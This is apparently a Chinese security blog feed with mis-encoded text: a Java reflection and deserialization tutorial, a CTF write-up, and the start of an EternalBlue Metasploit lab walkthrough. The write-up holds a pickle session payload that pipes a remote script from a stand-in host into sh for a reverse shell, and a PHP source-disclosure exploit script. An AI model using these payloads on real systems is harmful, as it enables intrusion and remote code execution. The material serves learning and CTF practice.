&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;,age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException,ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//é‡æ–°å¯¹readObjectå‡½æ•°è¿›è¡Œé‡å†™ï¼Œç„¶ååœ¨é‡Œé¢åŠ ä¸€æ¡å‘½ä»¤æ‰§è¡Œçš„è¯­å¥ï¼Œè¿™æ ·çš„è¯å°±ä¼šåœ¨ååºåˆ—åŒ–çš„æ—¶å€™å°±ä¼šæ‰§è¡Œï¼Œè¿™æ ·çš„è¯å°±ä¼šé€ æˆå®‰å…¨é—®é¢˜</span></span><br><span class="line">        ois.defaultReadObject();;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>); <span class="comment">//Runtime.getRuntime().exec ç”¨äºè°ƒç”¨å¤–éƒ¨å¯æ‰§è¡Œç¨‹åºæˆ–ç³»ç»Ÿå‘½ä»¤</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶ååœ¨å®šä¹‰ä¸€ä¸ªreflectç±»æ¥æµ‹è¯•ï¼Œå°±æ˜¯åœ¨è¿™ä¸ªreflectç±»é‡Œè¾¹è¿›è¡Œåå°„è°ƒè¯•</p><p><img src="../images/image-20230314222547749.png" alt="image-20230314222547749"></p><p>åœ¨è¿™ä¸ªç±»é‡Œè¾¹ï¼ŒgetClass()æ˜¯å¾—åˆ°personå¯¹è±¡çš„Class</p><p>åå°„çš„å®è´¨å°±æ˜¯æ“æ§Class</p><p><img src="../images/image-20230314223516379.png" alt="image-20230314223516379"></p><p><strong>è¿™é‡Œä»classé‡Œé¢å®ä¾‹åŒ–å¯¹è±¡ï¼Œæ–¹ä¾¿å«æœ‰æ— å‚å’Œæœ‰å‚çš„æ–¹æ³•</strong></p><p>é‡Œé¢çš„ç›´æ¥ä½¿ç”¨<code>c.newInstance();</code>æ˜¯è°ƒç”¨Personç±»é‡Œè¾¹çš„æ— å‚æ„é€ å‡½æ•°</p><p>ä½¿ç”¨ä¸‹é¢è¿™ä¸ªä»£ç çš„è¯æ˜¯è°ƒç”¨Personç±»é‡Œè¾¹çš„æœ‰å‚æ„é€ æ–¹æ³•ï¼Œåœ¨<code>c.getConstructor(String.class,int.class);</code>é‡Œè¾¹çš„å‚æ•°ï¼Œæ˜¯æ ¹æ®Personç±»é‡Œè¾¹è®¾ç½®å¥½çš„å‚æ•°æ¥è¿›è¡Œå¡«å†™ï¼Œå› ä¸ºPersonç±»é‡Œè¾¹çš„æ„é€ å‡½æ•°æ˜¯(string,int),</p><p>æ‰€ä»¥è¿™é‡Œå°±è¿™æ ·å¡«<code>c.getConstructor(String.class,int.class);</code></p><p>æœ€åç›´æ¥åœ¨<code>Person person1 =(Person) constructor.newInstance(&quot;tom&quot;,12);</code>é‡Œè¾¹è¾“å…¥å€¼ï¼Œç„¶åä½¿ç”¨S.o.pè¾“å‡ºå°±è¡Œäº†</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> c.getConstructor(String.class,<span class="type">int</span>.class);</span><br><span class="line"><span class="type">Person</span> <span class="variable">person1</span> <span class="operator">=</span>(Person) constructor.newInstance(<span class="string">&quot;tom&quot;</span>,<span class="number">12</span>);</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230314224245408.png" alt="image-20230314224245408"></p><p><strong>è·å–ç±»é‡Œé¢å±æ€§</strong></p><p><img src="../images/image-20230315165736464.png" alt="image-20230315165736464"></p><p>personç±»é‡Œè¾¹åªæœ‰ä¸¤ä¸ªå±æ€§ï¼Œä¸€ä¸ªå…¬å¼€çš„name,å’Œä¸€ä¸ªç§æœ‰çš„age</p><p><img src="../images/image-20230315165828360.png" alt="image-20230315165828360"></p><p><img src="../images/image-20230315170002571.png" alt="image-20230315170002571"></p><p>getField()æ–¹æ³•å°±æ˜¯è·å–å±æ€§çš„æ–¹æ³•ï¼Œå±äºFieldè¿™ä¸ªç±»ï¼Œä½†æ˜¯getField()æ–¹æ³•åªèƒ½è·å–å…¬å¼€å±æ€§çš„æ–¹æ³•ï¼Œ<strong>ç§æœ‰å±æ€§çš„ä½¿ç”¨å¦ä¸€ä¸ªæ–¹æ³•</strong>ï¼Œä¸‹é¢ä¼šç»§ç»­è®²</p><p>è¿™é‡Œä»£ç çš„æ„æ€æ˜¯ï¼Œå…ˆè·å–personç±»é‡Œè¾¹çš„å±æ€§ç”¨æ•°ç»„è£…èµ·æ¥ï¼Œç„¶åç”¨forå¾ªç¯è¿›è¡Œè¾“å‡º</p><p><img src="../images/image-20230315170301659.png" alt="image-20230315170301659"></p><p><img src="../images/image-20230315170308038.png" alt="image-20230315170308038"></p><p>getDeclaredFields();æ–¹æ³•å°±æ˜¯å¯ä»¥è®¿é—®ç§æœ‰å’Œå…¬æœ‰å±æ€§çš„ï¼Œå…¶ä»–å‡½æ•°ç§åªè¦å«æœ‰Declaredçš„,éƒ½æ˜¯å¯ä»¥è®¿é—®ç§æœ‰çš„</p><p>å¯ä»¥è·å–ç±»é‡Œè¾¹çš„å±æ€§äº†ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å°è¯•ä¿®æ”¹ä¸€ä¸‹è¿™äº›å±æ€§çš„å€¼äº†</p><p><img src="../images/image-20230315170925185.png" alt="image-20230315170925185"></p><p><img src="../images/image-20230315170937920.png" alt="image-20230315170937920"></p><p>è¿™å°±æ˜¯ä¿®æ”¹å‰åçš„æ ·å­</p><p>ä»£ç æ˜¯å…ˆè·å–åˆ°personç±»é‡Œè¾¹çš„å±æ€§ï¼Œå¹¶ç¡®å®šè¦ä¿®æ”¹å“ªä¸€ä¸ªå±æ€§ï¼Œè¿™é‡Œå†™çš„æ˜¯getField()ï¼Œæ²¡æœ‰åœ¨æœ«å°¾åŠ ä¸Šsï¼Œé‚£ä¹ˆæ²¡åŠ sçš„å°±æ˜¯å¯ä»¥è¿›è¡Œä¼ å‚æ¥ç¡®å®šè¦ä¿®æ”¹çš„å€¼çš„ï¼Œè¿™é‡Œä¼ çš„å‚æ•°æ˜¯nameï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥è¿›è¡Œnameå±æ€§å€¼çš„ä¿®æ”¹ï¼Œç„¶åä½¿ç”¨set()æ–¹æ³•æ¥ç¡®å®šä¿®æ”¹è°çš„ï¼Œä¿®æ”¹æˆå•¥å†…å®¹ï¼Œè¿™é‡Œæ·»åŠ çš„å¯¹è±¡å¿…é¡»æ˜¯å®ä¾‹åŒ–åçš„å¯¹åƒï¼Œæ‰€ä»¥æ˜¯person1</p><p><img src="../images/image-20230315171418567.png" alt="image-20230315171418567"></p><p><strong>ä¸Šé¢çš„ä»£ç æ˜¯ä¿®æ”¹ä¸äº†ç§æœ‰å±æ€§çš„</strong></p><p><img src="../images/image-20230315171806679.png" alt="image-20230315171806679"></p><p><img src="../images/image-20230315171818318.png" alt="image-20230315171818318"></p><p>æˆåŠŸè¿›è¡Œä¿®æ”¹ï¼Œè¿™é‡Œä¿®æ”¹çš„å…³é”®å°±æ˜¯è¿™ä¸¤è¡Œä»£ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;age&quot;</span>);</span><br><span class="line">field.setAccessible(<span class="literal">true</span>);</span><br></pre></td></tr></table></figure><p>å…¶ä»–ä»£ç çš„è§£é‡Šå’Œä¸Šé¢è¯´çš„ä¸€æ ·</p><p><strong>æ¥ä¸‹æ¥æ˜¯è°ƒç”¨ç±»é‡Œè¾¹çš„æ–¹æ³•</strong></p><p><img src="../images/image-20230315173404879.png" alt="image-20230315173404879"></p><p><img src="../images/image-20230315173513046.png" alt="image-20230315173513046"></p><p>è¿˜æ˜¯å’Œä¸Šé¢é‚£ä¸ªè·å–å±æ€§çš„æ–¹æ³•ä¸€æ ·ï¼Œä½¿ç”¨æœ«å°¾åŠ sçš„å‡½æ•°ï¼Œåˆ©ç”¨æ•°ç»„æ¥å­˜è´®ï¼Œç„¶åä½¿ç”¨forå¾ªç¯è¾“å‡º</p><p>ä»–è¿™é‡Œè·å–çš„æ–¹æ³•æœ‰personé‡Œè¾¹çš„ï¼Œè¿˜æœ‰Objectå¯¹è±¡çš„ï¼Œå› ä¸ºæ‰€æœ‰çš„ç±»éƒ½ç»§æ‰¿äºä»–ï¼Œä»–æ˜¯ä¸ªåº•å±‚ç±»</p><p><strong>æ¥ä¸‹æ¥æˆ‘ä»¬æ¢ä¸€ç§å†™æ³•ï¼Œä¸ä½¿ç”¨æ•°ç»„çš„å†™æ³•</strong></p><p><img src="../images/image-20230315174050014.png" alt=""></p><p><img src="../images/image-20230315174116598.png" alt="image-20230315174116598"></p><p><img src="../images/image-20230315174128040.png" alt="image-20230315174128040"></p><p>å°±æ˜¯è¿™ä¸¤ä¸ªç®€å•çš„ä»£ç ï¼Œç„¶åå°±å¯ä»¥è®¿é—®personç±»é‡Œè¾¹çš„å‡½æ•°æ–¹æ³•äº†ï¼Œè¿™é‡Œçš„getMethod()æ–¹æ³•å’Œé‚£ä¸ªgetConstructor()æ–¹æ³•ç±»ä¼¼ï¼Œéƒ½æ˜¯å¿…é¡»å¾—å‘Šè¯‰ä¸€ä¸‹æˆ‘ä»¬ä½¿ç”¨çš„æ˜¯å•¥ç±»å‹çš„å‚æ•°ã€‚è¿™é‡Œçš„invoke()æ–¹æ³•åœ¨è¿™é‡Œå°±æ˜¯è§¦å‘çš„æ„æ€ï¼Œå°±æ˜¯è§¦å‘personé‡Œè¾¹çš„actionæ–¹æ³•ï¼Œè¿™é‡Œä¼ çš„å‚æ•°å’Œä¸Šé¢çš„set()æ˜¯ä¸€ä¸ªæ„æ€ï¼Œå°±æ˜¯ç¬¬ä¸€ä½å¾—ä¼ å®ä¾‹åŒ–çš„å¯¹è±¡ï¼Œç„¶åç¬¬äºŒä½ä¼ å‚æ•°(å¯ä»¥åœ¨è¾“å‡ºå‡½æ•°åçš„æ—¶å€™è¿›è¡ŒæŸ¥çœ‹ï¼Œideaä¼šå‘Šè¯‰ä½ è¯¥ä¼ ä»€ä¹ˆå‚æ•°)</p><p><strong>æ¥ä¸‹æ¥å°±æ˜¯è°ƒç”¨ç§æœ‰æ–¹æ³•</strong></p><p><img src="../images/image-20230315175014198.png" alt="image-20230315175014198"></p><p>è¿™é‡Œè¯æ˜¯æŠŠgetMethodæ¢æˆäº†getDeclaredMethodï¼Œç„¶ååŠ ä¸€ä¸ªå¯ä»¥è¿›è¡Œä¿®æ”¹çš„æƒé™ï¼Œmethod.setAccessible(true);</p><p><strong>reflect.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.xml.internal.ws.api.model.MEP;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">reflect</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> person.getClass();</span><br><span class="line">        <span class="comment">//ä»classé‡Œé¢å®ä¾‹åŒ–å¯¹è±¡</span></span><br><span class="line">        c.newInstance();   <span class="comment">//è¿™ä¸ªæ˜¯åªèƒ½è°ƒç”¨personç±»é‡Œè¾¹çš„æ— å‚æ„é€ å‡½æ•°</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> c.getConstructor(String.class,<span class="type">int</span>.class);</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person1</span> <span class="operator">=</span>(Person) constructor.newInstance(<span class="string">&quot;tom&quot;</span>,<span class="number">12</span>);</span><br><span class="line">        System.out.println(person1);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        //è·å–ç±»é‡Œè¾¹çš„å±æ€§</span></span><br><span class="line"><span class="comment">//        Field[] fields = c.getDeclaredFields();</span></span><br><span class="line"><span class="comment">//        for (Field f:fields)</span></span><br><span class="line"><span class="comment">//         System.out.println(f);</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;age&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(person1,<span class="number">100</span>);</span><br><span class="line">        System.out.println(person1);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//è°ƒç”¨ç±»é‡Œè¾¹çš„æ–¹æ³•</span></span><br><span class="line"><span class="comment">//        Method[] method = c.getMethods();</span></span><br><span class="line"><span class="comment">//        for (Method m:method)</span></span><br><span class="line"><span class="comment">//        &#123;</span></span><br><span class="line"><span class="comment">//            System.out.println(m);</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"><span class="comment">//          Method method = c.getMethod(&quot;action&quot;, String.class);</span></span><br><span class="line"><span class="comment">//          method.invoke(person1,&quot;test&quot;);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> c.getDeclaredMethod(<span class="string">&quot;action&quot;</span>, String.class);</span><br><span class="line">        method.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        method.invoke(person1,<span class="string">&quot;test&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä»¥ä¸Šå°±æ˜¯å…¨éƒ¨javaåå°„çš„å­¦ä¹ è¿‡ç¨‹äº†</p>]]></content>
      
      
      
        <tags>
            
            <tag> java åå°„ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CCTF-web</title>
      <link href="/posts/4faf042b.html"/>
      <url>/posts/4faf042b.html</url>
      
        <content type="html"><![CDATA[<h2 id="è€ƒå¯Ÿçš„æ˜¯pythonååºåˆ—åŒ–åŠ sessionä¼ªé€ "><a href="#è€ƒå¯Ÿçš„æ˜¯pythonååºåˆ—åŒ–åŠ sessionä¼ªé€ " class="headerlink" title="è€ƒå¯Ÿçš„æ˜¯pythonååºåˆ—åŒ–åŠ sessionä¼ªé€ "></a>è€ƒå¯Ÿçš„æ˜¯pythonååºåˆ—åŒ–åŠ sessionä¼ªé€ </h2><p><img src="../images/image-20230312161118245.png" alt="image-20230312161118245"></p><p>é¢˜ç›®ç»™çš„æç¤ºæ˜¯æŸ¥çœ‹cookie</p><p>è¿™é“é¢˜ç”¨åˆ°çš„å·¥å…·  <a href="https://github.com/Paradoxis/Flask-Unsign">flask-unsign</a></p><p>è¿™é“é¢˜çš„è¯æ˜¯ç¦ç”¨äº†RæŒ‡ä»¤   æ‰€ä»¥çš„è¯æˆ‘ä»¬å°±ä¸èƒ½ä½¿ç”¨<code>__reduce__</code>äº†ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¾—æƒ³å…¶ä»–çš„åŠæ³•ä¾‹å¦‚b,cæŒ‡ä»¤é›†ç­‰ç­‰</p><p>è¿™é‡Œçš„è¯å¯ä»¥å‚è€ƒè¿™ç¯‡æ–‡ç«   <a href="https://zhuanlan.zhihu.com/p/89132768">python ååºåˆ—åŒ–</a></p><p>è¿™é‡Œæ˜¯å…ˆéšä¾¿æ³¨å†Œä¸€ä¸‹ï¼Œç„¶åæ‹¿åˆ°cookie</p><p><img src="../images/image-20230314211006068.png" alt="image-20230314211006068"></p><p>æ³¨å†Œåå»æŸ¥çœ‹cookie</p><p>ç„¶ååˆ©ç”¨å·¥å…·å¯¹cookieè¿›è¡Œè§£ç (flask)</p><p><img src="../images/image-20230314211102653.png" alt="image-20230314211102653"></p><p>è§£ç ååœ¨æ‹¿userinfoé‡Œçš„ä¸œè¥¿æ‹¿å»è§£ç </p><p><img src="../images/image-20230314211249493.png" alt="image-20230314211249493"></p><p>è§£ç åå¾—åˆ°è¿™ä¸¤ä¸ªå…³é”®ä¿¡æ¯ï¼Œç„¶åå»ä¸Šé¢ç»™çš„æ–‡ç« é‡Œçš„payloadè¿›è¡Œä¿®æ”¹</p><p><img src="../images/image-20230314211345239.png" alt="image-20230314211345239"></p><p><img src="../images/image-20230314211411148.png" alt="image-20230314211411148"></p><p>å°±æ˜¯ä¿®æ”¹è¿™ä¸¤ä¸ªåœ°æ–¹</p><p><strong>payload</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b&#x27;\x80\x03cuserinfo\nUser\n)\x81&#125;(V__setstate__\ncos\nsystem\nubVcurl https://your-shell.com/ip:port |sh\nb.&#x27;</span></span><br></pre></td></tr></table></figure><p>ç„¶åå¯¹è¿™ä¸ªè¿›è¡Œbase64è¿›è¡ŒåŠ å¯†ï¼Œå¹¶æŠŠåŠ å¯†åçš„ç»“æœæ›¿æ¢æ‰userinfoé‡Œçš„ä¸œè¥¿ï¼Œç„¶ååˆ©ç”¨å·¥å…·è¿›è¡ŒåŠ å¯†(è¿™é‡Œçš„å¯†é’¥æ˜¯  CCTF)</p><p>ç„¶åå»æ›¿æ¢æ‰cookieï¼Œç„¶ååˆ·æ–°è®¿é—®ä¸ªäººä¿¡æ¯ï¼Œå°±èƒ½åå¼¹shellåˆ°è‡ªå·±çš„æœåŠ¡å™¨ä¸Šäº†ï¼Œè®°å¾—è¦å…ˆè¿›è¡Œç›‘å¬</p><p>è¿™é‡Œç”Ÿæˆæ‰€æœ‰å››ä½å¤§å†™å­—æ¯ç»„æˆçš„å­—ç¬¦ä¸²ä»£ç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¤§å†™å­—æ¯åˆ—è¡¨</span></span><br><span class="line">uppercase_letters = <span class="built_in">list</span>(string.ascii_uppercase)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç”Ÿæˆæ‰€æœ‰å››ä½å¤§å†™å­—æ¯ç»„æˆçš„å­—ç¬¦ä¸²</span></span><br><span class="line">all_combinations = itertools.product(uppercase_letters, repeat=<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ‰“å°æ‰€æœ‰ç”Ÿæˆçš„å­—ç¬¦ä¸²</span></span><br><span class="line"><span class="keyword">for</span> combination <span class="keyword">in</span> all_combinations:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(combination))</span><br></pre></td></tr></table></figure><h2 id="è¿™é“é¢˜æ˜¯è€ƒå¯Ÿæºç æ³„éœ²"><a href="#è¿™é“é¢˜æ˜¯è€ƒå¯Ÿæºç æ³„éœ²" class="headerlink" title="è¿™é“é¢˜æ˜¯è€ƒå¯Ÿæºç æ³„éœ²"></a>è¿™é“é¢˜æ˜¯è€ƒå¯Ÿæºç æ³„éœ²</h2><p>å°±æ˜¯è€ƒå¯Ÿçš„è¿™ç¯‡æ–‡ç« ç»™å‡ºçš„æ¼æ´  <a href="https://cn-sec.com/archives/1530845.html">PHP &lt;= 7.4.21è¿œç¨‹æºç æ³„éœ²æ¼æ´</a></p><p><strong>è„šæœ¬</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">host = <span class="string">&quot;219.219.61.234:49155&quot;</span></span><br><span class="line">path = <span class="string">&quot;/&quot;</span></span><br><span class="line"><span class="keyword">if</span> path == <span class="string">&quot;&quot;</span>:</span><br><span class="line">    path = <span class="string">&quot;/&quot;</span></span><br><span class="line">payload = <span class="string">f&quot;GET <span class="subst">&#123;path&#125;</span> HTTP/1.1\nHost: <span class="subst">&#123;host&#125;</span>\n\nGET /xxx.ccc HTTP/1.1\n\n&quot;</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    ip, port = host.split(<span class="string">&quot;:&quot;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    ip = host</span><br><span class="line">    port = <span class="number">80</span></span><br><span class="line">s1 = socket.socket()</span><br><span class="line">s1.connect((ip, <span class="built_in">int</span>(port)))</span><br><span class="line">s1.send(payload.encode())</span><br><span class="line">text = s1.recv(<span class="number">4096</span>).decode()</span><br><span class="line"><span class="built_in">print</span>(text)</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘æ˜¯æ‹¿å»kaliè·‘çš„ï¼Œå› ä¸ºpycharmè·‘ä¸å‡ºæ¥ç»“æœ</p>]]></content>
      
      
      
        <tags>
            
            <tag> cumt-ctf-web final CCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ¸—é€å…¥é—¨1</title>
      <link href="/posts/67769678.html"/>
      <url>/posts/67769678.html</url>
      
        <content type="html"><![CDATA[<p>æ¸—é€çš„ç¬¬ä¸€æ­¥è‚¯å®šæ˜¯è¦è¿›è¡Œä¿¡æ¯æ”¶é›†äº†</p><p>é‚£ä¹ˆæˆ‘è¿™è¿™é‡Œå°±ä¸å¤šå†™äº†ï¼Œè¿™ç¯‡æ–‡ç« å†™çš„å¾ˆå…¨äº†  <a href="https://blog.csdn.net/MachineGunJoe/article/details/118769170">æ–‡ç« </a></p><p>è¿™é‡Œè¡¥å……ä¸€ä¸‹cæ®µçš„æ„æ€   <a href="https://www.cnblogs.com/renhaoblog/p/13026361.html">æ–‡ç« </a></p><p>è¿™é‡Œåˆ©ç”¨<code>Metasploit framework</code>æ¥è¿›è¡Œæ°¸æ’ä¹‹è“çš„å¤ç°ï¼Œæ¥å®ç°ä¸€ä¸‹å¯¹è¿™ä¸ªæ¸—é€å·¥å…·çš„è®¤è¯†</p><h2 id="æ°¸æ’ä¹‹è“å¤ç°"><a href="#æ°¸æ’ä¹‹è“å¤ç°" class="headerlink" title="æ°¸æ’ä¹‹è“å¤ç°"></a>æ°¸æ’ä¹‹è“å¤ç°</h2><p>å®éªŒç¯å¢ƒ</p><p>æ”»å‡»æœº kali linux ,ip:172.22.81.160 </p><p>é¶æœº ï¼šwindows7  ip: 192.168.59.129</p><p><img src="../images/image-20230309210251701.png" alt="image-20230309210251701"></p><p>è¿™é‡Œä¸‹çš„æ˜¯win7çš„ä¼ä¸šç‰ˆ</p><p><strong>1.è¿™é‡Œé¦–å…ˆç¬¬ä¸€æ­¥æ˜¯å¾—è¿›è¡Œä¿¡æ¯æ”¶é›†</strong></p><p>å…ˆæ‰«ä¸€ä¸‹ç«¯å£</p><p>åœ¨kailiä¸Šä½¿ç”¨nmapæ¢æµ‹win7çš„ç«¯å£ä¿¡æ¯ï¼š<strong>nmap 192.168.59.129 </strong>ï¼Œå¯ä»¥çœ‹åˆ°è¯¥æœºå™¨å·²å¼€å¯445ç«¯å£ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥æŸ¥çœ‹è¯¥445ç«¯å£çš„bannerä¿¡æ¯ï¼Œå‘½ä»¤ <strong>nmap -sV -p445 192.168.59.129</strong></p><p><img src="../images/image-20230309212745990.png" alt="image-20230309212745990"></p><p>è¿™é‡Œå¼€å¯çš„445ç«¯å£å°±æ˜¯è¿™ä¸ªæ¼æ´å‡ºç°çš„å…³é”®äº†ã€‚</p><p>è¿™é‡Œçš„nmapä¸­ sVçš„æ„æ€</p><p><img src="../images/image-20230309212636248.png" alt="image-20230309212636248"></p><p>ä¹Ÿå°±æ˜¯  â€”&gt;  æ¢æµ‹å¼€æ”¾ç«¯å£ä»¥ç¡®å®šæœåŠ¡/ç‰ˆæœ¬ä¿¡æ¯</p><p>æƒ³è¦æŸ¥çœ‹å…¶ä»–çš„å‘½ä»¤çš„è¯å¯ä»¥nmap -h</p><p><img src="../images/image-20230309213931076.png" alt="image-20230309213931076"></p><p>ä¸»æœºåå’Œwindowsç‰ˆæœ¬éƒ½èƒ½æˆåŠŸçœ‹åˆ°äº†</p><p><strong>2.ä½¿ç”¨kaliè‡ªå¸¦çš„metasploit(msf)</strong></p><p>å¦‚æœæ˜¯åˆæ¬¡ä½¿ç”¨ï¼Œå…ˆè¾“å…¥<strong>msfconsole</strong>è¿›å…¥msfï¼Œç„¶åé”®å…¥<strong>search ms17_010</strong>ï¼ŒæŸ¥è¯¢å¯¹åº”çš„æ¨¡å—</p><p><strong>ç¬¬ä¸€æ­¥</strong></p><p><img src="../images/image-20230309214251838.png" alt="image-20230309214251838"></p><p><strong>ç¬¬äºŒæ­¥</strong></p><p><img src="../images/image-20230309214321075.png" alt="image-20230309214321075"></p><p>è¿™é‡Œçš„è¯æ°¸æ’ä¹‹è“æ¼æ´å°±æ˜¯ms17_010,æ‰€ä»¥æˆ‘ä»¬searchä»–ï¼Œç„¶åå‡ºæ¥çš„å‘½ä»¤æœ‰<code>exploit</code>å’Œ<code>auxiliary</code></p><p>expçš„è¯æ˜¯è¿›è¡Œæ¼æ´åˆ©ç”¨çš„</p><p>auxæ˜¯æ˜¯è¿›è¡Œåˆ¤æ–­æ¼æ´æ˜¯å¦å­˜åœ¨çš„(å°±æ˜¯ä¸ªè¾…åŠ©å·¥å…·)</p><p><strong>3.æ¢æµ‹æ˜¯å¦å­˜åœ¨æ°¸æ’ä¹‹è“æ¼æ´</strong></p><p>å¯ä»¥å…ˆæ¢æµ‹ä¸€ä¸‹è¯¥ç³»ç»Ÿæ˜¯å¦å­˜åœ¨æ°¸æ’ä¹‹è“æ¼æ´ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥æ‰¹é‡æ‰«æCæ®µï¼Œä¸Šé¢æœ‰äº”ä¸ªæ¨¡å—å¯ä»¥é€‰æ‹©ï¼Œæ‰«æçš„è¯ä½¿ç”¨ auxiliary/scanner/smb/smb_ms17_010ï¼Œå› ä¸ºé‡Œé¢åŒ…å«äº†scannerï¼Œé”®å…¥å‘½ä»¤ <strong>use auxiliary/scanner/smb/smb_ms17_010</strong></p><p>æŸ¥è¯¢è¯¥æ¨¡å—éœ€è¦çš„å‚æ•°ï¼Œå‘½ä»¤ <strong>show options</strong>ï¼Œå¯ä»¥çœ‹åˆ°ä¸»è¦çš„å‚æ•°æ˜¯æ”»å‡»çš„ä¸»æœºRHOSTSï¼Œè®¾ç½®å‚æ•°ï¼š<strong>set rhosts 192.168.59.129</strong>ã€ä¸åˆ†å¤§å°å†™ã€‘ï¼Œå†é”®å…¥<strong>show options</strong> å³å¯æŸ¥çœ‹æ˜¯å¦æˆåŠŸèµ‹å€¼ä¸Šï¼Œå¦‚æœå†™é”™äº†å¯ä»¥é€‰æ‹©unset rhostsæ¥å–æ¶ˆé‡æ–°é€‰æ‹©</p><p><img 